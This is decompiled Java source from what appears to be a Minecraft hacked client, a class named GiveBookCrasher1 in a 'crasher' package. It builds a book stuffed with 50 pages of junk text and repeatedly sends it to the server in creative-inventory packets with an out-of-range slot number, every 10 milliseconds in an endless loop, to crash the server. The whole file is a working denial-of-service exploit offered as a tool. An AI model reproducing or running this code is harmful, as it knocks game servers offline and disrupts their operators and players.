// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.gbc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.client.Minecraft;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class GiveBookCrasher1
{
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                try {
                    final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
                    Minecraft.getMinecraft();
                    final String author = Minecraft.getSession().getUsername();
                    final String title = "Play with me.";
                    final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                    final NBTTagCompound tag = new NBTTagCompound();
                    final NBTTagList list = new NBTTagList();
                    for (int i2 = 0; i2 < 50; ++i2) {
                        final String siteContent = size;
                        final NBTTagString tString = new NBTTagString(siteContent);
                        list.appendTag(tString);
                    }
                    tag.setString("author", author);
                    tag.setString("title", title);
                    tag.setTag("pages", list);
                    book.setTagInfo("pages", list);
                    book.setTagCompound(tag);
                    while (true) {
                        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(Integer.MAX_VALUE, book));
                        Thread.sleep(10L);
                    }
                }
                catch (final Exception e2) {}
            }
        }.start();
    }
}
